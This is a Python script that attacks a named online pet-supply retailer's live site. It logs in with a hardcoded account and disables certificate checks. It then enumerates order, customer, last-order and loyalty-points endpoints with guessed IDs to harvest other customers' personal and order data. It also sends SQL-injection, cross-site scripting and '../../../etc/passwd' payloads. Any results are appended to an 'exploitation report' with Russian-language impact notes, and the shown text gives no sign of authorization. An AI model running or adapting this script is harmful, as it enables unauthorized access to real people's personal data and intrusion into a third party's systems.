#!/usr/bin/env python3
"""Test all endpoints found in browser Network tab"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# Test order-details endpoint for IDOR
print("[*] Testing order-details for IDOR...")
# Try to access other user's orders
order_ids = [1, 2, 100, 1000, 9999, 851483754]  # 851483754 from cart data

for order_id in order_ids:
    endpoints = [
        f"/myaccount/api/order-details/v3/order/{order_id}",
        f"/myaccount/api/order-details/v3/orders/{order_id}",
        f"/protected/api/order-details/v3/order/{order_id}",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    if any(key in data_str.lower() for key in ['email', 'name', 'address', 'phone', 'order', 'total', 'price', 'article', 'product']):
                        print(f"  [CRITICAL] IDOR - Order data: {ep}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "order_id": order_id,
                            "data": data_str[:500]
                        })
        except: pass

# Test customer-config with different IDs
print("\n[*] Testing customer-config for IDOR...")
customer_ids = [53260509, 53260633, 1, 2, 100, 999, 1000, 9999, 99999]

for customer_id in customer_ids:
    ep = f"/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}"
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(data, dict) and data:
                data_str = json.dumps(data)
                # Check for real config data (not just empty)
                if data_str not in ['{}', 'null'] and len(data_str) > 10:
                    if any(key in data_str.lower() for key in ['email', 'name', 'address', 'phone', 'preference', 'setting', 'config']):
                        print(f"  [CRITICAL] IDOR - Customer config: {ep}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
    except: pass

# Test lastOrders endpoint - try to get other user's orders
print("\n[*] Testing lastOrders for IDOR...")
for customer_id in customer_ids:
    ep = f"/myaccount/api/order-details/v3/customer/{customer_id}/lastOrders"
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(data, dict) and data:
                data_str = json.dumps(data)
                if any(key in data_str.lower() for key in ['order', 'total', 'price', 'article', 'product']):
                    print(f"  [CRITICAL] IDOR - Last orders: {ep}")
                    print(f"      Data: {data_str[:300]}")
                    found_vulns.append({
                        "type": "idor",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "customer_id": customer_id,
                        "data": data_str[:500]
                    })
    except: pass

# Test protected endpoints
print("\n[*] Testing protected endpoints...")
for customer_id in customer_ids:
    endpoints = [
        f"/protected/api/loyalty-management/bonus-points/customer/{customer_id}",
        f"/protected/api/loyalty-management/memberships/customer/{customer_id}",
        f"/protected/api/loyalty-management/memberships/customer/{customer_id}/overview",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    if any(key in data_str.lower() for key in ['points', 'balance', 'membership', 'level', 'benefit']):
                        print(f"  [CRITICAL] IDOR - Protected data: {ep}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
        except: pass

# Test feature-flags endpoint for injection
print("\n[*] Testing feature-flags for injection...")
try:
    malicious_payloads = [
        {"test": "'; DROP TABLE--"},
        {"test": "1 OR 1=1"},
        {"test": "<script>alert(1)</script>"},
        {"test": "../../../etc/passwd"},
    ]
    for payload in malicious_payloads:
        resp = s.post(f"{base}/myaccount/api/order-details/v3/feature-flags", json=payload, timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            data_str = json.dumps(data)
            if "error" in data_str.lower() and ("sql" in data_str.lower() or "syntax" in data_str.lower()):
                print(f"  [HIGH] Possible injection in feature-flags: {payload}")
                found_vulns.append({
                    "type": "injection",
                    "severity": "HIGH",
                    "endpoint": "/myaccount/api/order-details/v3/feature-flags",
                    "payload": payload
                })
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'order_id' in v:
            print(f"    Order ID: {v['order_id']}")
        if 'customer_id' in v:
            print(f"    Customer ID: {v['customer_id']}")
        if 'data' in v:
            print(f"    Data: {v['data'][:200]}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ IDOR УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'order_id' in v:
                f.write(f"**Order ID:** `{v['order_id']}`\n\n")
            if 'customer_id' in v:
                f.write(f"**Customer ID:** `{v['customer_id']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Доступ к данным других пользователей\n")
            f.write("- Раскрытие персональной информации\n")
            f.write("- Просмотр заказов других пользователей\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No additional IDOR vulnerabilities found")

print("=" * 70)

